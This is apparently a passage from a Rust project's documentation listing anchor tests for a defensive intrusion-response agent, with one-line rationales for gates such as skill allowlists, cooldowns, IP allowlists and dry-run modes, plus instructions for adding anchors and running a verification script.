- `crates/agent/src/incident_honeypot_router.rs::tests::try_handle_honeypot_routing_writes_decision_and_arms_cooldown_for_new_suspicious_login` — happy-path: new suspicious_login → audit row tagged `ai_provider="honeypot-router"`, cooldown set, caller's blocked-set updated.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::returns_false_when_no_telegram_client` — no Telegram = no suggestion (returns false before building Incident or audit).
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::returns_false_when_action_is_not_honeypot` — only honeypot-action AiDecisions trigger this path; block-ip/suspend-user flow normal pipeline.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::auto_executes_when_high_confidence_and_auto_execute` — auto-fire: confidence ≥ threshold AND `auto_execute=true` writes real-execution audit row.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::auto_execute_skipped_when_confidence_below_threshold` — confidence below threshold falls through to defer even when `auto_execute=true`.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::defers_to_operator_when_telegram_succeeds` — defer path: successful Telegram send → `dry_run` audit row tagged `ai_provider="honeypot-suggestion"`, returns true (handled).
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::defers_with_dry_run_flag_propagated_to_audit` — `dry_run` flag preserved end-to-end so post-incident review distinguishes suggested-then-confirmed vs suggested-then-ignored.
- `crates/agent/src/incident_honeypot_suggestion.rs::tests::defers_without_audit_when_decision_writer_is_none` — defensive: missing writer (early boot/fault) returns true without panic.

### Coverage batch 3 (test/coverage-batch-3 — 2026-05-07)

Same operator hard-rule that drove batches 1+2: "≥70% coverage in the same PR as the code." This batch raises the worst-covered modules in the agent runtime — most of these test the early-exit / gate / disabled-feature branches that ship a lot of dead code paths in production but are rarely exercised by the existing happy-path tests. Together these anchors pin the *gate* contracts so that toggling `responder.enabled`, `correlation.enabled`, or removing optional clients (geoip / abuseipdb / threat_feed / decision_writer) cannot silently change the runtime's behaviour.

#### Decide-skill actions surface

- `crates/agent/src/decision_skill_actions.rs::tests::ignore_action_returns_formatted_reason` — the `Ignore` action emits a stable reason string that the audit log keys off. Anti-regression for any change that drops the reason or wraps it in an Err.
- `crates/agent/src/decision_skill_actions.rs::tests::dismiss_action_returns_formatted_reason` — same for `Dismiss`. Pins the audit-row shape produced by both no-op verdicts.
- `crates/agent/src/decision_skill_actions.rs::tests::unhandled_actions_return_none` — actions outside the explicit match table return `None` (caller falls through). Pins the closed-set contract: adding a new variant requires touching this dispatcher.
- `crates/agent/src/decision_skill_actions.rs::tests::suspend_user_sudo_blocks_when_not_in_allowed_skills` — `suspend_user_sudo` is gated by `allowed_skills`; an empty allowlist must NOT execute. Operator-facing: the safety gate that prevents a misconfigured deployment from auto-sudo-locking users.
- `crates/agent/src/decision_skill_actions.rs::tests::kill_process_blocks_when_not_in_allowed_skills` — same gate for `kill_process`. Anti-regression for dropping the gate when refactoring the dispatcher.
- `crates/agent/src/decision_skill_actions.rs::tests::block_container_blocks_when_not_in_allowed_skills` — same gate for `block_container`.
- `crates/agent/src/decision_skill_actions.rs::tests::suspend_user_sudo_executes_in_dry_run_when_allowed_and_registered` — the happy path: skill in allowlist + registered in registry + responder.dry_run = the dispatcher actually invokes the skill. Pins the registry round-trip.
- `crates/agent/src/decision_skill_actions.rs::tests::kill_chain_response_skips_when_skill_missing_without_allowlist_gate` — when the kill-chain skill isn't registered, the dispatcher returns `None` instead of panicking. Pins the missing-skill defensive branch.
- `crates/agent/src/decision_skill_actions.rs::tests::monitor_skips_when_skill_missing` — same for `monitor_ip`.

#### Pre-AI prelude (correlation + LSM auto-enable)

- `crates/agent/src/incident_prelude.rs::tests::correlation_disabled_returns_empty_and_does_not_observe` — when `cfg.correlation.enabled = false` the prelude returns an empty Vec AND must NOT call `correlator.observe()`. Pins the off-state contract: toggling correlation off-then-on cannot silently feed events the operator wanted excluded.
- `crates/agent/src/incident_prelude.rs::tests::correlation_enabled_observes_even_when_no_related_incidents_yet` — first incident has no relatives but observe() must run, so a second incident with the same pivot can correlate. Pins the "observe early" contract that keeps history consistent across gate-skipped incidents.
- `crates/agent/src/incident_prelude.rs::tests::lsm_auto_enable_skipped_when_already_enabled` — when `state.lsm_enabled = true` the auto-enable branch is skipped entirely, even for an incident that would normally trigger it. Pins the one-way-only escalation contract.

#### Auto-rule fast path

- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_short_circuits_when_responder_disabled` — Watch mode (responder.enabled = false) suppresses every auto-rule path, even for high-severity detectors. Pins the operator's read-only invariant.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_short_circuits_when_auto_rules_disabled` — operator-tunable kill switch: `auto_rules_enabled = false` disables the path without disabling the responder.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_returns_false_for_non_auto_rule_detector` — only the explicit auto-rule detector list routes through this path. A non-listed detector (e.g. `packet_flood`) returns false. Anti-regression for accidentally widening the trigger set.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_skips_internal_ips` — internal/private IPs are NEVER auto-blocked. Pins the network-attack-surface invariant.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_skips_allowlisted_ips` — IPs on the static `cfg.trusted_ips` list AND the runtime `dynamic_trusted_ips` list are skipped. Pins both halves of the operator allowlist contract.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_skips_active_operator_sessions` — IPs with active operator sessions skip auto-block (matches `incident_obvious` policy). Pins the same-session-no-block contract.
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_happy_path_writes_decision_and_sets_cooldown` — happy path: enabled responder + auto-rule detector + external IP + no operator session = block fires AND cooldown is armed. Anti-regression for any change that skips cooldown arming (would cause re-block thrash).
- `crates/agent/src/incident_auto_rules.rs::tests::try_handle_auto_rule_respects_cooldown_window` — second invocation within cooldown window returns false. Pins the rate-limit contract that prevents block-storm.

#### Obvious-incident fast path

- `crates/agent/src/incident_obvious.rs::tests::try_handle_obvious_incident_full_happy_path_for_first_hit_detector` — first hit on an obvious-detector incident (e.g. `reverse_shell`) writes a decision JSONL row, updates `ip_reputations`, and arms the cooldown. Pins the audit-trail shape produced before the AI router ever runs.
- `crates/agent/src/incident_obvious.rs::tests::try_handle_obvious_incident_skips_active_operator_session` — incidents from IPs with an active operator session are NEVER auto-blocked, regardless of detector severity. Same-session-no-block invariant mirroring `incident_auto_rules`.
- `crates/agent/src/incident_obvious.rs::tests::try_handle_obvious_incident_skips_when_no_ip_entity` — incidents missing an IP entity fall through without panicking and without writing decisions. Defensive contract for the entity-extraction step.
- `crates/agent/src/incident_obvious.rs::tests::try_handle_obvious_incident_returns_false_for_non_obvious_detector` — only the explicit obvious-detector list routes through this fast path. Anti-regression for widening the obvious set without operator review.

#### Forensics capture early-exit

- `crates/agent/src/incident_forensics.rs::tests::capture_incident_forensics_with_skips_forensics_when_pid_missing` — high-severity incidents without `pid` in evidence skip the forensics adapter while pcap still fires from the IP entity. Pins the missing-PID branch (`evidence.get("pid")` returning None).
- `crates/agent/src/incident_forensics.rs::tests::capture_incident_forensics_with_skips_pcap_when_no_ip_entity` — high-severity incidents without an IP entity skip the pcap adapter while forensics still fires from the PID. Pins the missing-IP branch.

#### Advisory cache consumption

- `crates/agent/src/incident_advisory.rs::tests::handle_advisory_violation_consumes_advisory_even_when_telegram_client_present` — the matched cache entry is removed regardless of whether the Telegram alert succeeded, was rate-limited, or dropped. Pins the cache-consume contract: a stale advisory cannot re-fire the same alert across executions.
- `crates/agent/src/incident_advisory.rs::tests::handle_advisory_violation_skips_when_evidence_is_not_array` — non-array `incident.evidence` falls through to the no-match branch instead of panicking. Pins the schema-defensive Option-chain (`evidence.as_array()?`).

#### Enrichment optional-client gates

- `crates/agent/src/incident_enrichment.rs::tests::log_threat_feed_match_returns_when_threat_feed_disabled` — `state.threat_feed = None` short-circuits before any IP lookup. Pins the optional-client contract.
- `crates/agent/src/incident_enrichment.rs::tests::lookup_incident_geoip_returns_none_when_client_disabled` — same for `geoip_client`. The `?` short-circuit must keep the function from synthesising a default GeoInfo.
- `crates/agent/src/incident_enrichment.rs::tests::enrich_attacker_identity_returns_early_when_no_inputs` — both `ip_geo` and `ip_reputation` None means no profile creation, no `attacker_profiles` mutation. Pins the cheap-exit contract on the very first line.
- `crates/agent/src/incident_enrichment.rs::tests::enrich_attacker_identity_skips_when_no_ip_entity` — incidents without an IP entity walk the entities list, find nothing, and skip the mutation block — even with valid GeoIP/AbuseIPDB inputs.
- `crates/agent/src/incident_enrichment.rs::tests::backfill_enrichment_returns_early_when_no_clients` — both clients None = early return without touching `attacker_profiles` or SQLite. Pins the nothing-to-do exit at the top of the function.

#### Auto-dismiss noise gate

- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_noise_returns_false_when_responder_disabled` — Watch mode (responder.enabled = false) keeps every low-severity incident visible. Pins the operator hard rule that auto-dismiss only fires in Guard mode.
- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_noise_returns_false_when_dry_run` — DryRun mode mirrors Watch mode for the noise gate. Pins the second half of `is_noise_gate_eligible`.
- `crates/agent/src/incident_autodismiss.rs::tests::try_autodismiss_noise_returns_true_in_guard_mode` — happy path: Guard mode + low-severity = true (auto-dismiss). Pins the body of the function (decision-writer attempt + KG ingest_decision call).

## Adding a new anchor

When fixing a bug that fits any of these shapes, add the anchor here in the same PR:

- The bug recurred (operator reported it twice).
- The bug is a class, not an instance (drift between two surfaces, stale state crossing a boundary, counter-as-gauge confusion, etc.).
- The fix is structural (new helper, new invariant, new contract) rather than a pointed code change.

Format the entry consistent with the existing ones. Keep the description to one sentence. Reference the historical bug (date or PR number) in the description so a future reader understands the cost of the test.

## Running the verify script

```bash
./scripts/verify-anchor-tests.sh
```

Greps the source tree for every named test in this file. Exits non-zero if any are missing. CI runs this on every PR via `.github/workflows/anchor-tests.yml`.
